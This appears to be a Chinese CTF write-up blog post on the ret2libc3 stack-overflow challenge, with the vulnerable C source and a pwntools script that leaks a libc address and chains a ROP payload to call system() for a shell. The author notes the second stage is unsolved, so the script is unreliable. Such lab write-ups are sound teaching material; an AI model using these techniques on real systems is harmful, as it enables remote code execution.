---
layout:     post
title:      ret2libc3-待续
subtitle:   解题思路
date:       2018-07-09
author:     Mao
header-img: img/home-bg-geek.jpg
catalog: true
tags:
    - PWN
    - 栈溢出
---



## 所需环境

环境要求

> ubuntu 16.04 64bit
>
> python 2.7



所需工具

> pwntools
>
> gdb-peda
>
> 32位 ida



## 分析过程

程序分析

用ida打开ret2libc3，发现gets函数存在溢出



## 解题思路

leak函数地址，找到libc的基地址



![image-20180912132338503](http://maoshuu.oss-cn-beijing.aliyuncs.com/blog/2018-09-12-071859.png)





exp

第一次send之后，ebp和esp已经改变，第二次send的时候，溢出点不再是112，问题未解决

```python
#!/usr/bin/env python

from pwn import *

remote_is = 1

if remote_is:
    sh = remote('127.0.0.1', 4444)
else:
    sh = process('./ret2libc3')

ret2libc3 = ELF('./ret2libc3')
libc = ELF('./libc.so')

puts_plt = ret2libc3.plt['puts']
libc_start_main_got = ret2libc3.got['__libc_start_main']
main = ret2libc3.symbols['main']
#gets_addr = ret2libc3.symbols['gets']

payload = flat(['A' * 112, puts_plt, main, libc_start_main_got])
sh.sendlineafter('Can you find it !?', payload)

#print "get the related addr"
libc_start_main_addr = u32(sh.recv()[0:4])

# readelf -s libc.so | grep 'start_main'
libc_start_main = libc.symbols['__libc_start_main'] 
libc_system = libc.symbols['system']
libc_base = libc_start_main_addr - libc_start_main
#print hex(libc_base)
system_addr = libc_base + libc_system

print "get shell"
gets_addr = ret2libc3.symbols['gets']
pop_ebx_ret = 0x0804841d
buf = 0x0804b000 - 0x100 # cat /proc/`pidof ret2libc3`/maps

#raw_input('#')
payload = flat(['A' * 112, gets_addr, pop_ebx_ret, buf, system_addr, 0xdeadbeef, buf])
sh.sendline(payload)

sh.interactive()
```



ret2libc3.c

```c
#include <stdio.h>
#include <stdlib.h>
#include <time.h>

char buf2[100];

void secure(void)
{
    int secretcode, input;
    srand(time(NULL));

    secretcode = rand();
    scanf("%d", &input);
    if(input == secretcode)
        puts("no_shell_QQ");
}

int main(void)
{
    setvbuf(stdout, 0LL, 2, 0LL);
    setvbuf(stdin, 0LL, 1, 0LL);

    char buf1[100];

    printf("No surprise anymore, system disappeard QQ.\n");
    printf("Can you find it !?");
    gets(buf1);

    return 0;
}
```



## 总结